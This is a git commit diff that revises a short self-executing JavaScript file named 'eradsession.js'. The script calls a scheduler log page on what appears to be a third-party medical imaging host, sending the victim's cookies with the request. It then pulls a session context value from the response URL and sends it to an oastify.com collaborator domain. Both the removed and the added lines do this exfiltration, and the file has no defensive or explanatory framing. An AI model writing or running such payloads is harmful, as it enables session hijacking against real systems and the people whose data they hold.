1b8e35458b5fc0118ccc9213707a3080e3e50040
tomoncrss <tonymyson89823@gmail.com>
2026-02-25 11:52:38 +0330

    Update eradsession.js

--- eradsession.js
+++ eradsession.js
@@ -1,8 +1,8 @@
 (function(){
-fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog&cIDField=0LID&cInputID=xxy&cDispField=0LID&cDispField=0LED&cDispField=0LUI&cDispField=0LAC&cDispField=0LTA&cDispField=0LLP&cDispField=0LSD&cDispField=0LMO&cDispField=0LIN',{credentials:'include',redirect:'manual'})
+fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog&cIDField=0LID&cInputID=xxy&cDispField=0LID&cDispField=0LED&cDispField=0LUI&cDispField=0LAC&cDispField=0LTA&cDispField=0LLP&cDispField=0LSD&cDispField=0LMO&cDispField=0LIN',{credentials:'include'})
 .then(r=>{
-let loc=r.headers.get('Location');
-if(loc) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?loc='+encodeURIComponent(loc),{mode:'no-cors'});
+let url=r.url;
+let c=url.match(/cContext=([^&]+)/);
+if(c) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?loc='+c[1],{mode:'no-cors'});
 });
 })();
-
